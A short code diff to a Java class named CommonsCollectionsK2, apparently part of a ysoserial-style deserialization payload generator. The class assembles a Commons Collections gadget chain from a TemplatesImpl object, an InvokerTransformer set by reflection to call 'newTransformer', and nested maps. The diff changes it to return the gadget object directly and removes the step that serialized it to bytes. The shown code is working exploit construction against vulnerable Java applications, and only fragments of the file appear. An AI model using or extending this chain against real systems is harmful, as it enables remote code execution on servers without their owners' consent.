@@ -15,7 +15,7 @@ import java.util.Map;
 
 public class CommonsCollectionsK2 implements ReleaseableObjectPayload<Object>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Object                  tpl         = Gadgets.createTemplatesImpl(type, param);
         InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         HashMap<String, String> innerMap    = new HashMap<String, String>();
@@ -28,19 +28,7 @@ public class CommonsCollectionsK2 implements ReleaseableObjectPayload<Object>{
 
         Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
 
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(outerMap);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return outerMap;
     }
 
     @Override
